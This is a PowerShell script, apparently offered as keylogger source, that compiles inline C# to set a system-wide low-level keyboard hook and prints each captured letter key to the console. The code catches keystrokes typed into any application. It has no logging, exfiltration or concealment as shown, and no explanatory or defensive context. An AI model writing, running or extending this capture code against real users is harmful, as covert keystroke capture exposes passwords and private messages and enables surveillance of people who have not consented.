Add-Type -TypeDefinition '
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger {
  public static class Program {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private static HookProc hookProc = HookCallback;
    private static IntPtr hookId = IntPtr.Zero;
    private static int keyCode = 0;

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    public static int WaitForKey() {
      hookId = SetHook(hookProc);
      Application.Run();
      UnhookWindowsHookEx(hookId);
      return keyCode;
    }

    private static IntPtr SetHook(HookProc hookProc) {
      IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
      return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
    }

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
        keyCode = Marshal.ReadInt32(lParam);
        Application.Exit();
      }
      return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
  }
}
' -ReferencedAssemblies System.Windows.Forms

while ($true) {
    $key = [System.Windows.Forms.Keys][KeyLogger.Program]::WaitForKey()
  if ($key -eq "T") {
    Write-Host "T"
	}
	if ($key -eq "S") {
        Write-Host "S"
  }
  	
	if ($key -eq "O") {
        Write-Host "O"
  }
  	
	if ($key -eq "N") {
        Write-Host "N"
  }
    	
	if ($key -eq "E") {
        Write-Host "E"
  }
    	
	if ($key -eq "Y") {
        Write-Host "Y"
  }
  	if ($key -eq "W") {
        Write-Host "W"
  }
  	if ($key -eq "I") {
        Write-Host "I"
  }  	
	if ($key -eq "R") {
        Write-Host "R"
  }  
  if ($key -eq "Q") {
        Write-Host "Q"
  }  
  if ($key -eq "A") {
        Write-Host "A"
  }  	
  if ($key -eq "X") {
        Write-Host "X"
  }  	
  if ($key -eq "C") {
        Write-Host "C"
  }  	
  if ($key -eq "V") {
        Write-Host "V"
  }  	
  if ($key -eq "B") {
        Write-Host "B"
  }  	
  if ($key -eq "U") {
        Write-Host "U"
  }  	
  if ($key -eq "M") {
        Write-Host "M"
  }  	
  if ($key -eq "L") {
        Write-Host "L"
  }  	
  if ($key -eq "K") {
        Write-Host "K"
  }  	
  if ($key -eq "J") {
        Write-Host "J"
  }  	
  if ($key -eq "D") {
        Write-Host "D"
  }  	
  if ($key -eq "F") {
        Write-Host "F"
  
  }  	
  if ($key -eq "G") {
        Write-Host "G"
  }
   	if ($key -eq "H") {
        Write-Host "H"
  }
  if ($key -eq "P") {
        Write-Host "P"
   }  	
  }
  